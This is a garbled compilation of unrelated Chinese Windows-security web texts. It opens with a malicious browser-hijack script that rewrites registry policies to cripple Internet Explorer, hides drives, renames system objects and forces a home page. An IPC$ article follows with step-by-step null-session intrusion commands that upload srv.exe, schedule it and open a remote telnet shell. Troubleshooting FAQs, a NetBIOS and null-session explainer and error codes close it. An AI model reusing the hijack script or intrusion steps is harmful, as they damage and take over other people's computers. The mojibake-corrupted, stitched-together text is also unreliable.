Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Check_If_Default", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\CalendarContact", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\ResetWebSettings", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\AdvancedTab", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Advanced", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoBrowserContextMenu", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoOpenInNewWnd", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoSelectDownloadDir", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoSearchCustomization", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoExternalBranding", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoFindFiles", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoJitsetup", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoSplash", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoUpdateCheck", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoFindFiles", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoBrowserSaveAs", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoBrowserClose", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoFileNew", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoFileOpen", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoTheaterMode", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoViewSource", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoBandcustomize", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoToolbarCustomize", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoFavorites", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoAddingChannel", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoChannelUI", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoBrowserOptions", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoHelpItemNetScapeHelp", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoHelpItemTipOfTheDay", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoHelpitemTutorial", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoHelpItemSendFeedBack", "00000001", "REG_DWORD");
Shl.RegWrite("HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\First Home Page", "http://hunkloveme.yeah.net");
Shl.RegWrite ("HKEY_CLASSES_ROOT\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\","混客玩笑");
Shl.RegWrite ("HKEY_CLASSES_ROOT\\CLSID\\{21EC2020-3AEA-1069-A2DD-08002B30309D}\\","混客玩笑");
Shl.RegWrite ("HKEY_CLASSES_ROOT\\CLSID\\{2227A280-3AEA-1069-A2DE-08002B30309D}\\","混客玩笑");
Shl.RegWrite ("HKEY_CLASSES_ROOT\\CLSID\\{450D8FBA-AD25-11D0-98A8-0800361B1103}\\","混客玩笑");
Shl.RegWrite ("HKEY_CLASSES_ROOT\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\","混客玩笑");
Shl.RegWrite ("HKEY_CLASSES_ROOT\\CLSID\\{871C5380-42A0-1069-A2EA-08002B30309D}\\","混客玩笑");
Shl.RegWrite ("HKEY_CLASSES_ROOT\\CLSID\\{992CFFA0-F557-101A-88EC-00DD010CCC48}\\","混客玩笑");
Shl.RegWrite ("HKEY_CLASSES_ROOT\\CLSID\\{BDEADF00-C265-11d0-BCED-00A0C90AB50F}\\","混客玩笑");
Shl.RegWrite ("HKEY_CLASSES_ROOT\\CLSID\\{D6277990-4C6A-11CF-8D87-00AA0060F5BF}\\","混客玩笑");
Shl.RegWrite ("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Nodrives","1", "REG_DWORD");
var expdate = new Date((new Date()).getTime() + (24 * 60 * 60 * 1000 * 90));
documents.cookie="Chg=general; expires=" + expdate.toGMTString() + "; path=/;"
//end set home page
var expdate = new Date((new Date()).getTime() + (1));
documents.cookie="Chg=general; expires=" + expdate.toGMTString() + "; path=/;"
// end set IE Window title
//add favorites this is the common part; should be here if you want to add favorites
var WF, Shor, loc;
WF = FSO.GetSpecialFolder(0);
loc = WF + "\\Favorites";
if(!FSO.FolderExists(loc))
{
loc = FSO.GetDriveName(WF) + "\\Documents and Settings\\" + Net.UserName + "\\Favorites";
if(!FSO.FolderExists(loc))
{
return;
}
}
//end common part 
}
catch(e){ }
}
catch(e){ }
}
function init(){
setTimeout("f()", 1000);
}
init();</script></body>
</html>
"
function SetNewWords()
{
var NewWords;
NewWords = unescape(Words);
document.write(NewWords);
}
SetNewWords();
// -->
</SCRIPT>
</HEAD>
<BODY>
</BODY>
</HTML>
</HTML>
拒绝背后黑手的窥探 IPC$漏洞大揭秘 
£牐牫３Ｔ谕ø上听人说IPC漏洞，那么IPC漏洞到底是什么呢？网络流氓们是怎么利用这个漏洞的呢？抱着这样的问题，我们一起来看看笔者带来的精彩文章！ 
£牐  £牐犑裁词荌PC漏洞 £牐  
£牐營PC是共享“命名管道”的资源，它对于程序间的通讯很重要。在远程管理计算机和查看计算机的共享资源时使用。利用IPC我们可以与目标主机建立一个空的连接(无需用户名与密码)，而利用这个空的连接，我们还可以得到目标主机上的用户列表。但是，一些别有用心者会利用IPC，查找我们的用户列表，并使用一些字典工具，对我们的主机进行攻击。 £牐  
£牐犎绾卫û用IPC漏洞 
£牐  £牐牴セ髡咴谡饫镆话慊嵊玫健读鞴狻氛飧鋈砑þ，兔子在这里特别提醒你，《流光》是一款功能非常强大的软件，在我们使用时一定要注意，不得进行非法破坏！ 
£牐  £牐牭谝徊剑涸诵小读鞴狻·(现在的最新版本是4.6)，按“CTRL+R”键弹出扫描框，我们这里只是做个测试，目的是告诉大家这个漏洞的危害，所以我们现在随便选择一段IP进行扫描。我们扫描的是127.0.0.1(如图)，其它的均使用默认，不需要改变设置。 
£牐  £牐牭诙þ步：大家打开Win2000自带的命令提示行，注：这里我们不是教大家怎么破坏，只是给大家介绍这个漏洞的危害，所以下面的IP是假设的,并不存在。 
£牐  £牐 1. C:＼>net use ＼＼127.0.0.1＼IPC "" /user:"admintitrators" 
£牐  £牐犝饩褪歉詹庞谩读鞴狻飞ǖ降挠没§名是administrators，密码为“空”的IP地址，如果是攻击者的话，他就会用这样的命令来与127.0.0.1建立一个连接，因为密码为“空”，所以第一个引号处就不用输入，后面一个双引号里的是用户名，输入administrators，命令即可成功完成。 
£牐  £牐 2. C:＼>copy srv.exe ＼＼127.0.0.1＼admin 
£牐  £牐犗雀粗苨rv.exe上去，在流光的Tools目录下就有(这里的是指admin用户的c:＼winnt＼system32＼，大家还可以使用c、d，意思是C盘与D盘，这看你要复制到什么地方去了)。 
£牐  £牐 3. C:＼>net time ＼＼127.0.0.1 
£牐  £牐牪椴槭奔洌¬发现127.0.0.1的当前时间是2002/3/19上午11:00，命令成功完成。 
£牐  £牐 4. C:＼>at ＼＼127.0.0.1 11:05 srv.exe 
£牐  £牐犛胊t命令启动srv.exe吧(这里设置的时间要比主机时间快，不然你怎么启动啊，呵呵！) £牐  
£牐 5. C:＼>net time ＼＼127.0.0.1 
£牐  £牐犜俨椴榈绞奔涿挥校咳绻û127.0.0.1的当前时间是2002/3/19上午11:05，那就准备开始下面的命令。 £牐  
£牐 6. C:＼>telnet 127.0.0.1 99 
£牐  £牐犝饫锘嵊玫絋elnet命令吧，注意端口是99。Telnet默认的是23端口，但是我们使用的是SRV在对方计算机中为我们建立一个99端口的Shell。 
£牐  £牐犓淙晃颐强梢訲elnet上去了，但是SRV是一次性的，下次登录还要再激活！所以我们打算建立一个Telnet服务！这就要用到ntlm了。 
£牐  £牐 7.C:＼>copy ntlm.exe ＼＼127.0.0.1＼admin 
£牐  £牐犛肅opy命令把ntlm.exe上传到主机上(ntlm.exe也是在《流光》的Tools目录中)。 
£牐  £牐 8. C:＼WINNT＼system32>ntlm 
£牐  £牐犑淙雗tlm启动(这里的C:＼WINNT＼system32>指的是对方计算机，运行ntlm其实是让这个程序在对方计算机上运行)。当出现“DONE”的时候，就说明已经启动正常。然后使用“net start telnet”来开启Telnet服务！ 
£牐  £牐牭谌ý步：我们使用Telnet到对方计算机上去，Telnet 127.0.0.1，接着输入用户名与密码就进入了，操作就像在DOS上操作一样简单！ 
£牐  £牐犎绾畏婪禝PC漏洞 
£牐  £牐牽戳松厦娴姆椒ㄊ遣皇蔷醯酶眉觳庖幌伦约菏欠裼姓飧雎┒矗¬如果有，还不赶快把这个漏洞给补上？跟我来吧，下面我们将教你如何防范IPC漏洞的入侵 
£牐  £牐 1.禁止建立空连接 
£牐  £牐犖颐鞘紫仍诵衦egedit，找到如下组建[HKEY_LOCAL_MACHINE＼SYSTEM＼CurrentControlSet＼Control＼LSA]把RestrictAnonymous = DWORD的键值改为：00000001。 £牐  
£牐 2.禁止管理共享 
£牐  £牐犕¬样也是找到如下组键[HKEY_LOCAL _MACHINE＼SYSTEM＼CurrentControlSet＼Services＼LanmanServer＼Parameters]把AutoShareServer = DWORD的键值改为:00000000。 £牐  
£牐 3.到http://www.heibai.net/download/show.php?id=2194&down=1下载delshare.zip。该工具能自动永久删除Windows 2000所有默认共享的两个批处理文件。 
£牐  £牐 4.如果还觉得麻烦的话，也可以把“net share ipc /delete”放进你的启动栏里。 
£牐  £牐 5.当然，最简单的方法就是把的密码设置得复杂一些，以免被一些不怀好意的人使用工具破解出来。不过想提醒大家一点，任何复杂的密码都有可能被破解。 
常见问题及解答
常见问题及解答
1:请问win386.swp是什么文件，为什么删除不了 
答：是虛擬内存文件（在9X和ME的系統中存在） 
你可以來設定它的大小的！
参考：最小值应该是物理内存的数加上12（物理内存在256MB以上的） 
内存在128MB或者更少的建议最小值为物理内存的1.75倍 
在128MB到256Mb之间的设置为1.5倍 
256Mb以上就设置为2.5倍
建议页面文件放在一个硬盘分区内``分散影响速度！！
也可以禁止使用！(系统默认是windows自己管理！)
你可以在DOS下用del命令删除。 (不过开机后它又会自动生成的) 
2：如何恢复注册表（for 9x/me) 
答：启动到DOS下输入scanreg /restore可以选择恢复。选择出问题前的日期哦!
更详细的注册表恢复与备份请看这里! 
2000/xp中
我们一般在启动计算机看见“正在启动2000/xp”的信息后，按F8键。然后在出现的界面中选择“最后一次正确的配置”然后回车，启动系统，操作完毕后，注册表将被还原到上次成功启动计算机的时候的状态！ 
3：金山毒霸2002／金山网镖2002故障及不能升级问题的处理方法 
答：如果您的毒霸不能卸载，您可以按照以下步骤卸载您的毒霸 
1、使用"开始"菜单中"金山毒霸2002"中的"卸载金山毒霸2002"选项将金山毒霸2002自动卸载。 
2、在"我的电脑"中金山毒霸2002的安装位置将金山毒霸2002的文件夹删除。 
3、从注册表中删除金山毒霸2002的键值。从开始菜单中选择"运行"，输入regedit后回车进入注册表。 
在编辑菜单下选择"查找"选择查看内容为"主键"输入antivirus后选择查找。将在kingsoft目录中找到的 
antivirus目录删除（其他杀毒软件也有用antivirus的，请注意只删除kingsoft目录中的antivirus）直到 
显示查找完毕。 
4、查找C:\Program files\InstallSheild Installation Information\，该文件夹为隐藏文件夹，默 
认情况下看不见，输入路径｀可以进入！ 
毒霸安装历史文件在这个文件中，其特征是SETUP.EXE文件的图标是毒霸 的双箭头标识。找到后删除这个文件夹。 
＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝ 
如果毒霸2002不能在线升级或升级后出错怎么办呢? 
如果在线升级时提示有部分程序在使用中无法完成升级，您先终止毒霸的相关组件包括网 
镖、防火墙、邮件监控、小企鹅安全助手等，然后同时按住CTRL+ALT+DELETE(热启动的组合键），在弹出的窗口 
中，终止KAVTASKMNG程序的运行（如果有的话）。最后请单击开始|程序|金山毒霸XXXX|智能更新程序，这 
样毒霸的在线升级就会成功。 
如果还不能在线升级或升级后出错，请点击http://www.duba.net/download/other/02013101.htm下载 
相应版本的毒霸智能更新升级程序（update.exe）测试版，将其解压缩保存在毒霸的安装目录（如c:\kav） 
，覆盖旧版本文件后再尝试在线升级，方法是点击开始|程序|金山毒霸xx|智能更新程序，升级时建议使用 
广州3服务器。
毒霸2002问答集 
4：Windows不定时搜寻软驱问题 
答：如果你的 Windows 98/Me 常常会有事没事就去检查软驱，你可以从下面几个方面依顺序来检查，排除问题，以下，越在前面的方法，可能性越大。 
　　?清除开始菜单中，「文档」里的资料，如果你曾经开启过软盘上的文件，而这文件名称还存在于「文档」里的话，Windows 有可能会去搜寻软驱。 
　　?清除开始菜单中，「运行」里的项目。 
　　?到「设置」>>「控制面板」，打开「系统」，到「性能」这页，按「文件系统」，到「磁盘」，不要勾「每次开机就搜寻新的软驱」，按确定，当你重新启动计算机之后，Windows 就不会去侦测你的软驱。 
　　?检查一下是不是你的防毒软件会去检查软驱（例如 McAfee 、Antivirus 、Pccillin..等），请查阅你的防毒软件说明。 
　　?检查一下是不是你计算机上的一些工具软件会去检查你的软驱。 
　　?检查 MSDOS.SYS 这个文件里面（你必须知道如何修改文件属性，才能修改 MSDOS.SYS 的内容），有没有 LocalLoadHigh=1 这一行叙述，有的话，删掉。 
　　?检查一下是不是病毒的关系，造成系统不定时去搜寻软驱（例如 NEUVILLE 病毒）。 
　　?检查 registry：HKEY_CLASSES_ROOT/CLSID 的值，看看有没有任何的路径是指向到软盘上的。 

5：ME的关机选单里没有重新启动到MS-DOS模式怎么办 
答：当你在Windows Me中，按「开始」>>「关机」，在这个关闭 Windows 的窗口里，会找不到「重新启动到 MS-DOS」模式的选项，这不是你的计算机出了什么问题，而是 Windows Me 已经不再提供这项功能。 
　　在 Windows Me 唯一可以真正启动到以往纯 DOS 模式的方法，只剩利用「启动盘」一途了，顺便提一下，无论是 Windows 95、98 或 Me，它们在「附件」下的「MS-DOS」这是一个虚拟 DOS 程序，换言之，就一个在 Protect Mode下仿真 MS-DOS 的作业环境的程序，而「重新启动到 MS-DOS模式」就如同 DOS 操作系统，是属于一个 Real Mode 的作业环境。 
　　对多数的MS-DOS程序而言，都可以在虚拟的 DOS 环境下运行。但是有些比较特殊的 DOS 程序，好比需要主动掌控内存资源的（像是某些古老的 DOS Game）、或是需要存取硬件资源的（像是更新 BIOS 的程序），这一类的 DOS 程序都不一定能在虚拟的 DOS 环境中执行。 
　　注：在关机选单中，还会有一项「休眠」功能，但是并不是在每一台计算机上都会出现，如果你的主机板不支持休眠的功能，就不会有此选项。 
网上邻居内幕－NETBIOS的概念
***微软网络浏览过程简介*** 
在“Windows NT系统管理技术内幕”一书中，讲到了一个非常具有代表性的问题，我把它摘抄了下来： 
问：什么情况下会导致在网络邻居中计算机能看见却无法访问或可以访问却看不见？ 
请选择最佳答案： 
A.你的网络存在物理问题,比如网线 
B.作为域主浏览器的Windows NTserver的浏览服务坏了 
C.Windows NTserver网卡有问题 
D.你的网络没有问题,用户描述的是正常的微软浏览现象 
正确答案 D 
书上的解释:微软的网络浏览可能在使用中出现"中断",而实际上它们并没有中断, 这种误解是由于用户对微软网络浏览的处理过程不熟悉造成的。 
就象同学们经常在抱怨的“为什么别人的网上邻居可用，我的却不行？”“为什么有时候可以浏览，有时候却无法浏览网络？”解铃还须系铃人，让我们一起去看看微软的网络浏览到底是如何实现的。鉴于大家可能对NT的“域”概念还不甚了解，出现浏览故障的也多为98的机子，我将以98的“工作组模式”为大家讲解。 
1.什么是浏览列表（Browsing List） 
在微软网络中，用户可以在浏览列表里看到整个网络（何指？子网还是广播域？大家可以考虑考虑）上所有的计算机。当你通过网上邻居窗口打开整个网络时，你将看到一个工作组列表，再打开某个工作组，你将看到里面的计算机列表（也可在 DOS方式下用net view /domain:workgroupname命令得到），这就是我们所说的 Browsing List。工作组从本质上说就是共享一个浏览列表的一组计算机，所有的工作组之间都是对等的，没有规定不可以让所有的计算机同处于一个工作组中。 
2.浏览列表在哪里 
曾在木棉上看到过一场争论，有人说：网上邻居里的计算机列表是广播查询得来的。可有人举反例说：我的同学都关机了，可我还是能在网上邻居里看到它，应该是从HUB或交换机之类较为固定的设备的缓存中取得的。 其实他们都只说对了一个方面，把他们二人的说法结合起来就是正确答案了--- 浏览列表是通过广播查询浏览主控服务器，由浏览主控服务器提供的。 
3.浏览主控服务器又是什么 
浏览主控服务器是工作组中的一台最为重要的计算机，它负责维护本工作组中的浏览列表及指定其他工作组的主控服务器列表，为本工作组的其他计算机和其他来访本工作组的计算机提供浏览服务，每个工作组都为会每个传输协议选择一个浏览主控服务器，而我们经常遇到的无法浏览网络的错误大多是因为你所处的工作组没有浏览主控服务器而造成的。你可以在一个工作组中用NBTSTAT -a computername 命令找出使用NBT协议的浏览主控服务器，它的标识是含有\\_MSBROWSE_名字段。 
4.浏览主控服务器是如何指定的 
缺省情况下，win98工作组中的浏览主控服务器是该工作组中第一台启用文件及打印机共享功能的计算机，也允许手工将一台win计算机配置为浏览主控服务器（方法会在后面讲述网络配置时具体介绍，但由于浏览主控服务器需要维护动态浏览列表，性能会受影响），如果一个工作组中有多台计算机配置了这个选项，或是当前的浏览主控服务器关闭了系统，又没有其他计算机启用主控设置时，就要进行主控浏览器的选举。 
5.如何通过浏览器选举产生浏览主控服务器 
关于浏览器的选举报文,不太好抓包,我就只好按书上的东西来讲述了.其实过程很简单,首先由一台计算机发送一个选举临界报文,该报文包含了来自发送计算机的信息(操作系统,版本及NET名等),选举报文向网络中广播,工作组中的每一台计算机都会用自身信息与选举报文进行优先级比较,主要是操作系统起主要作用,记得好像是NT Server>NT Workstation>Win98>WFWG,反正到最后是那个自身条件最好的成为新的浏览主控服务器. 
6.整个网络浏览的过程是怎样的 
当一台win98进入网络时，如果它带有服务器服务（启用了文件及打印机共享）会向网络广播宣告自己的存在，而浏览主控服务器会取得这个宣告并将它放入自己维护的浏览列表中；而没有在相应协议上绑定文件及打印机共享的计算机则不会宣告，因而也就不会出现在网络邻居里了。 
当客户计算机想获得需要的网络资源列表时，首先会广播发出浏览请求，浏览主控服务器收到请求后，如果请求的是本组的浏览列表，则直接将客户所需的资源列表发回；如果请求的是其它工作组的浏览列表，浏览主控服务器会根据本身Browsing List中的记录找到相应工作组的主控浏览器返回给用户，用户可从那里得到它想要的浏览列表。至于如何去和另一台计算机共享交换资源，就不是我们这里要讨论的问题了。 
明白了网络浏览的原理，下面我给大家讲一个有用的应用，现在很多同学出于安全的考虑都不太欢迎陌生人通过网上邻居访问自己的机子，可有时下部电影又需要给认识的同学共享出来，因而还不能删除文件及打印机共享服务。怎么办？有些人给共享名加个$，以达到隐藏的效果，可这用DOS下的net share是可被看到的；有些人给共享加上密码，可听说这也是有办法破解的，而且很容易激起“黑客同志”的好奇心。有没有办法将自己的机器在网络邻居里隐藏起来呢？而对于认识的同学可以让他用\\IP 来访问。 
想对了，关键就是要阻止自己的机器向网络中去宣告自己，而且我知道我们其中的一些人已经将此变成了现实，至于方法嘛，就不要来问我了。 
注：因为有关win98浏览服务的资料很少，涉及的书籍也多为以NT的“域”模型进行介绍，因而我只能根据自己的理解结合netxray的实践来测试，细节部分难免有错，欢迎大家指正。 
7.在我的网上邻居里为什么有些机子访问不了 
如果微软的网上邻居真能做到所见即所得，相信抱怨它的人不会象现在这么多，可通过前面对浏览服务的介绍，大家已经知道这是不可能的，因为浏览列表的获得不是通过访问其中每一台机子得到的，很多时候网络中的计算机并不能正确更新浏览列表。当一台计算机正常关机时，它会向网络发出广播宣告，使浏览主控服务器及时将它从浏览列表中删除；而非正常关机后，浏览列表里仍会把该条目保持很长一段时间(NT下是45分钟),这就是我们仍能在网络邻居里看到它的原因.而98的稳定性是众所周知的 ----在还没来得及关机前就已经崩溃了^-^ 
SMB（Server Message Block）协议在NT/2000中用来作文件共享，在NT中，SMB运行于NBT（NetBIOS over TCP/IP）上，使用137，139（UDP），139（TCP）端口。 
在2000中，SMB可以直接运行在tcp/ip上，而没有额外的NBT层，使用TCP 445端口。因此在2000上应该比NT稍微变化多一些。可以在“网络连接/属性/TCPIP协议/属性/高级/WINS中设置启用或者禁用NBT（NetBIOS over TCP/IP）。 
当2000使用网络共享的时候，就面临着选择139或者445端口了。下面的情况确定会话使用的端口： 
1、如果客户端启用了NBT，那么连接的时候将同时访问139和445端口，如果从445端口得到回应，那么客户端将发送RST到139端口，终止这个端口的连接，接着就从445端口进行SMB的会话了；如果没有从445端口而是从139得到回应，那么就从139端口进行会话；如果没有得到任何回应，那么SMB会话失败。 
2、如果客户端禁用了NBT，他就将只从445端口进行连接。当然如果服务器（开共享端）没有445端口进行SMB会话的话，那么就会访问失败了，所以禁用445端口后，对访问NT机器的共享会失败。 
3、如果服务器端启用NBT，那么就同时监听UDP 137、138端口和TCP139，445。如果禁用NBT，那么就只监听445端口了。 
所以对于2000来说，共享问题就不仅仅是139端口，445端口同样能够完成。 
关于空会话 
NULL会话（空会话）使用端口也同样遵循上面的规则。NULL会话是同服务器建立的无信任支持的会话。一个会话包含用户的认证信息，而NULL会话是没有用户的认证信息，也就好比是一个匿名的一样。 
没有认证就不可能为系统建立安全通道，而建立安全通道也是双重的，第一，就是建立身份标志，第二就是建立一个临时会话密匙，双方才能用这个会话进行加密数据交换（比如RPC和COM的认证等级是PKT_PRIVACY）。不管是经过NTLM还是经过Kerberos认证的票据，终究是为会话创建一个包含用户信息的令牌。（这段来自Joe Finamore） 
根据WIN2000的访问控制模型，对于空会话同样需要提供一个令牌。但是空会话由于是没有经过认证的会话，所以令牌中不包含用户信息，因此，建立会话双方没有密匙的交换，这也不能让系统间发送加密信息。这并不表示空会话的令牌中不包含SID，对于一个空会话，LSA提供的令牌的SID是S-1-5-7，这就是空会话建立的SID，用户名是ANONYMOUS LOGON。这个用户名是可以在用户列表中看到的。但是是不能在SAM数据库中找到，属于系统内置的帐号。 
（关于这部分对NULL SESSION的分析，可以参照：《NULL Sessions In NT/2000》http://rr.sans.org/win/null.php） 
NULL会话几乎成为了微软自己安置的后门，但是微软为什么要来设置这样一个“后门”呢？我也一直在想这个问题，如果NULL会话没有什么重要的用途，那么微软也应该不会来设置这样一个东西。好不容易才在微软上找到这个： 
当在多域环境中，要在多域中建立信任关系，首先需要找到域中的PDC来通过安全通道的密码验证,使用空会话能够非常容易地找到PDC，还有就是关于一些系统服务的问题。而且LMHOSTS的#Include就需要空会话的支持，可以参考文章： 
http://support.microsoft.com/default.aspx?...b;EN-US;q121281 
还有 
http://support.microsoft.com/default.aspx?scid=kb;EN-US;q124184 
其实建立一个空会话的条件也非常严格。首先要能够满足上面的，也就是打开TCP 139和TCP 445端口。我们可以从一次关闭这两个端口的情况中看得出来。服务器关闭445和139端口，然后我们来进行空会话的连接。首先，客户端打算连接的是445端口，然后再试图连接139端口。当然最后还是失败了。 
仅仅开放这两个端口还不行，服务器还必须得打开IPC$共享。如果没有IPC共享，即使共享一个文件，有权限为Anonymous Logon，也不能建立会话，即使权限设置为完全控制，出现的连接错误依然是权限不够。这和其他帐号是不一样的。如果要允许一个文件夹共享能够类似IPC$（命名管道而非共享）能够使用空会话，那么需要修改注册表： 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters\ 
中的：NullSessionShares，添加新的共享名，这样才能建立一个共享的空会话。这时，将不依赖IPC的存在了。（即使这样的空会话对于后面的突破也是一点没可取之处的，因为没有了IPC$命名管道，RPC不可取了，这下知道IPC这个命名管道的具体实现了。呵呵） 
虽然空会话建立的要求很严格，但是那都是默认建立的。既然是默认的，对于使用WIN2K系统的服务器来说，就还是有利用的价值。最明显的就是空会话可以很方便地连接到其他的域,枚举用户、机器等。这也就是扫描软件进行探测的原理。 
1. 有些人给共享名加个$，以达到隐藏的效果，可这用DOS下的net share是可被看到的； 
这种隐藏只是微软Windows标准客户端net view的限制，不是服务端的限制，网络传输过程中是一视同仁的，所以直接修改客户端解除这种限制或者使用第三方客户端软件均可看到所谓的隐藏共享，比如smbclient就是典型代表。而直接修改windows客户端的办法，99年袁哥贴过，我在华中Security版上转载过，精华区中还在。 
2. 有些人给共享加上密码，可听说这也是有办法破解的； 
这个破解要看是什么层面上的，纯暴力破解的就不必说了，那当然总是可以的。而95/98另有漏洞，袁哥发现的，就是他那个著名的vredir.vxd，服务端验证密码时所用长度居然是客户端提供的，这就意味着至多猜测256次(事实上没这么多，考虑可打印字符范围)即可进入。当初N多人用这种办法非法浏览别人的机器。2000年报告微软，现在已修补。 
http://security.nsfocus.net/index.php?act=...o=view&adv_id=6 
顺便说一句，利用该漏洞可以快速穷举出原始口令，虽然在攻击中这是不必要的。因而我只能根据自己的理解结合netxray的实践来测试，细节部分难免有错， 
推荐www.ethereal.com提供的Ethereal，这是我所见过的对SMB解码最强的免费软件，有Unix/Windows版，提供源码。 
3. 在2000中，SMB可以直接运行在tcp/ip上，而没有额外的NBT层，使用TCP 445端口。因此在2000上应该比NT稍微变化多一些。 
事实上正相反，在ssaxh_capabilities字段中指明不使用"扩展安全验证"，此时使用原有身份验证机制，只需去掉NBT层的Session Request，将139/TCP改成445/TCP，一样可以成功建立空会话，并且成功打开"\\<target ip>\IPC$"。 
至于更高层的RPC Over SMB，更是不必作任何变动。换句话说，从139/TCP换到445/TCP，整个通信过程中减少了一对NBT Session Request/Response，后面的报文对于两者来说是完全一致的。 
而所谓的NBT层，即使在445通信中也未去掉，一直存在着，区别只是上面这段话。 
4. 如果客户端启用了NBT，那么连接的时候将同时访问139和445端口， 
微软并没有让139/TCP与445/TCP公平竞争。发起连接的SYN包在宏观上是同时发出的，具体起来，有时是先向139/TCP发起连接请求，有时是先向445/TCP发起连接请求，有点随机性。 
在向139/TCP发送三次握手的最后一个ACK报文时，Windows顺手携带了数据，这里以一个刻意弄错的NetBIOS名(*SMBSERV<00...(8)>)做了一次NBT Session Request。而445/TCP不需要NBT层的会话。 
由于刻意弄错的NetBIOS名，139/TCP很难竞争过445/TCP。服务端返回Negative NBT Session Response，并且执行了close()操作。这使得必须重新建立到139/TCP的连接(传输层的TCP连接)。 
可以看出，那个刻意弄错的NetBIOS名仅仅是为了给445/TCP制造抢先的机会。遗憾的是，445/TCP不争气，这个端口上的任务繁重、负载较高，即使在这种不公平竞争的情况下，139/TCP仍有可能重新抢在445/TCP之前建立NBT会话(注意，不是TCP连接)。于是445口会回送RST，后续SMB会话建立在139/TCP连接之上。 
微软自己的操作系统不认"*SMBSERV<00...(8)>"，但是Samba Server 2.2.5认，居然返回Positive Session Response。这成为精确识别Samba Server的方法之一。 
微软在<<Direct Hosting of SMB Over TCP/IP>>中不会提这些的，只是说139/TCP、445/TCP公平竞争，优先使用最早返回的响应报文。不要相信它的鬼话。 
话说回来，如非需求所致，完全不必关心这种差别。有需求的时候，这种差别是致命的。 
5. 最明显的就是空会话可以很方便地连接到其他的域,枚举用户、机器等。这也就是扫描软件进行探测的原理。 
XP、2003缺省禁止在空会话上进行PolicyAccountDomainInformation查询，可以看到LsarOpenPolicy2(44)失败，权限否定。如果事先指定有效帐号、口令建立SMB会话，而非空会话，LsarOpenPolicy2(44)将成功返回。 


Windows 死机密码  
使用Windows出现蓝色屏幕是经常的事，而且每每因为不清楚错误的来源而频繁重新安装系统，劳神费时。下列收集了一些Windows死机密码，供大家参考。 
0x0000 操作完成
0x0001 不正确的函数
0x0002 系统找不到指定的文件
0x0003 系统找不到指定的路径
0x0004 系统无法打开文件
0x0005 拒绝存取
0x0006 无效的代码
0x0007 内存控制模块已损坏
0x0008 内存空间不足，无法处理这个指令
0x0009 内存控制模块地址无效
0x000a 环境不正确
0x000b 尝试载入一个格式错误的程序
0x000c 存取码错误
0x000d 资料错误
